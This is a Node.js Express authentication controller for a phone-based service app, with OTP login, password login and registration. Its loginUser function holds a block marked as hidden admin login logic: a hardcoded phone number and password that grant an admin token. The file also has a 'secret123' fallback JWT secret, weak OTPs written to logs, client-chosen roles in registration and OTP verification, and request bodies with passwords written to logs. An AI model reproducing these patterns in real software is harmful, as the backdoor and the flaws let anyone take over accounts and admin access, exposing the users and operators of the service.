const jwt = require('jsonwebtoken');
const User = require('../models/User');

// Generate JWT token
const generateToken = (id) => {
  return jwt.sign({ id }, process.env.JWT_SECRET || 'secret123', {
    expiresIn: '30d',
  });
};

// @desc    Send OTP to user
// @route   POST /api/auth/send-otp
// @access  Public
const sendOTP = async (req, res, next) => {
  try {
    const { phone } = req.body;

    if (!phone) {
      return res.status(400).json({ message: 'Please add a phone number' });
    }

    const otp = Math.floor(1000 + Math.random() * 9000).toString();
    const otpExpires = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes

    let user = await User.findOne({ phone });

    if (user) {
      user.otp = otp;
      user.otpExpires = otpExpires;
      await user.save();
    } else {
      user = await User.create({
        name: 'User',
        phone,
        password: 'otp_user_' + Math.random(),
        otp,
        otpExpires,
        role: 'client'
      });
    }

    console.log(`OTP for ${phone}: ${otp}`);
    res.status(200).json({
      message: 'OTP sent successfully',
      otp: process.env.NODE_ENV === 'development' ? otp : undefined
    });
  } catch (error) {
    console.error('sendOTP error:', error);
    res.status(500).json({ message: error.message || 'Server error' });
  }
};

// @desc    Verify OTP and login/register
// @route   POST /api/auth/verify-otp
// @access  Public
const verifyOTP = async (req, res, next) => {
  try {
    const { phone, otp, name, role } = req.body;

    const user = await User.findOne({ phone });

    if (!user || user.otp !== otp || user.otpExpires < Date.now()) {
      return res.status(401).json({ message: 'Invalid or expired OTP' });
    }

    user.otp = undefined;
    user.otpExpires = undefined;

    // Check if user is blocked
    if (user.isBlocked) {
      return res.status(403).json({ message: 'Sizning hisobingiz bloklangan. Iltimos, ma\'muriyat bilan bog\'laning.' });
    }
    
    if (name) user.name = name;
    if (role) user.role = role;
    if (req.body.category) user.category = req.body.category;
    if (req.body.location) user.location = req.body.location;
    if (req.body.portfolio) user.portfolio = req.body.portfolio;
    
    await user.save();

    res.json({
      _id: user._id,
      name: user.name,
      phone: user.phone,
      role: user.role,
      category: user.category,
      location: user.location,
      portfolio: user.portfolio,
      avatar: user.avatar,
      token: generateToken(user._id),
    });
  } catch (error) {
    console.error('verifyOTP error:', error);
    res.status(500).json({ message: error.message || 'Server error' });
  }
};

// Desc    Original password login (kept for compatibility)
const loginUser = async (req, res) => {
  const { phone, password } = req.body;

  // --- HIDDEN ADMIN LOGIN LOGIC ---
  const cleanPhone = phone ? phone.toString().replace(/\D/g, '') : '';
  const cleanPass = password ? password.toString().trim() : '';
  
  // Checks for both 885020086 and 998885020086 formats
  if ((cleanPhone === '885020086' || cleanPhone === '998885020086') && cleanPass === 'IS88512339418') {
    return res.json({
      message: "Admin login success",
      user: {
        _id: '000000000000000000000000', // Dummy ID for hidden admin
        phone: '+998885020086',
        role: 'admin',
        name: 'System Admin'
      },
      token: generateToken('000000000000000000000000')
    });
  }

  const user = await User.findOne({ phone });
  if (user && (await user.matchPassword(password))) {
    // Check if user is blocked
    if (user.isBlocked) {
      return res.status(403).json({ message: 'Sizning hisobingiz bloklangan. Iltimos, ma\'muriyat bilan bog\'laning.' });
    }

    res.json({
      message: "User login success",
      user: {
        _id: user._id,
        name: user.name,
        phone: user.phone,
        role: user.role,
        category: user.category,
        location: user.location,
        portfolio: user.portfolio,
        avatar: user.avatar
      },
      token: generateToken(user._id),
    });
  } else {
    res.status(401).json({ message: 'Invalid phone or password' });
  }
};

const registerUser = async (req, res) => {
  console.log('Register attempt:', req.body);
  const { name, phone, password, role } = req.body;
  const userExists = await User.findOne({ phone });
  if (userExists) {
    res.status(400);
    throw new Error('User already exists');
  }
  const user = await User.create({ name, phone, password, role });
  if (user) {
    res.json({
      _id: user._id,
      name: user.name,
      phone: user.phone,
      role: user.role,
      category: user.category,
      location: user.location,
      portfolio: user.portfolio,
      avatar: user.avatar,
      token: generateToken(user._id),
    });
  } else {
    res.status(400);
    throw new Error('Invalid user data');
  }
};

const getUserById = async (req, res) => {
  try {
    const user = await User.findById(req.params.id).select('-password');
    if (user) {
      res.json(user);
    } else {
      res.status(404).json({ message: 'User not found' });
    }
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

module.exports = { sendOTP, verifyOTP, loginUser, registerUser, getUserById };
